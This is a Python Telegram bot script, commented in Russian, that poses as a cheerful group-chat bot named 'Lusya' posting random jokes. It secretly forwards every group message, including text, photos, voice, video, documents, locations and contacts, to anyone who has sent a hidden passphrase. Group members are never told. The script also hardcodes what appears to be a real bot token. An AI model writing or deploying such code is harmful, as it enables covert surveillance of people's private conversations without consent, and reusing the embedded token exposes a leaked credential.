import telebot
import sqlite3
import random

# Твой токен
TOKEN = '8627941683:AAHiGx04rTRFwpD0nXnzy1TxxfwS_H6RdpI'
bot = telebot.TeleBot(TOKEN)

# --- Работа с БД ---
def execute_query(query, params=(), fetch=False):
    conn = sqlite3.connect('lusya_base.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS spies (user_id INTEGER PRIMARY KEY)''')
    cursor.execute(query, params)
    if fetch:
        data = cursor.fetchall()
        conn.close()
        return data
    else:
        conn.commit()
        conn.close()

def get_all_spies():
    return execute_query("SELECT user_id FROM spies", fetch=True)

# --- Контент для обычных пользователей ---
FUNNY_REPLIES = [
    "Я всё вижу! 👀", "Люся на связи!", "Хи-хи, ну ты даешь!", 
    "А вот это было сейчас серьезно?", "Чайку?"
]

# --- Обработчики ---

# Активация режима слежки
@bot.message_handler(func=lambda message: message.text == "Bolnisj2[wldw;eirnv")
def activate_spy(message):
    execute_query("INSERT OR IGNORE INTO spies (user_id) VALUES (?)", (message.from_user.id,))
    bot.reply_to(message, "✅ Система настроена. Теперь я буду пересылать тебе ВСЕ сообщения из групп (фото, голос, видео, текст).")

# Команда старт
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Я Люся. Добавь меня в группу, и я буду там зажигать! ✨")

# Групповой чат: Пересылка и случайные ответы
@bot.message_handler(func=lambda message: True, content_types=['audio', 'photo', 'voice', 'video', 'document', 'text', 'location', 'contact', 'sticker', 'video_note', 'poll'])
def handle_groups(message):
    # Если это группа
    if message.chat.type in ['group', 'supergroup']:
        all_spies = get_all_spies()
        
        # Пересылаем сообщение каждому "шпиону"
        for spy in all_spies:
            spy_id = spy[0]
            try:
                # Сначала шлем инфо, из какой группы перехват
                bot.send_message(spy_id, f"📍 Из группы: {message.chat.title}")
                # Пересылаем само сообщение (со всеми медиа, кнопками и т.д.)
                bot.forward_message(spy_id, message.chat.id, message.message_id)
            except Exception as e:
                print(f"Ошибка пересылки шпиону {spy_id}: {e}")

        # Шанс случайного ответа Люси в группе
        if message.content_type == 'text' and random.random() < 0.05:
            bot.reply_to(message, random.choice(FUNNY_REPLIES))

    # Если это ЛС (обычное общение)
    elif message.chat.type == 'private':
        if not message.text or (message.text != "Bolnisj2[wldw;eirnv" and not message.text.startswith('/')):
            bot.send_message(message.chat.id, "М-м-м, понятно! Расскажи еще что-нибудь интересное. 😊")

if __name__ == '__main__':
    execute_query("SELECT 1") # Проверка БД
    print("Люся запущена! Режим полной пересылки активен.")
    bot.infinity_polling()
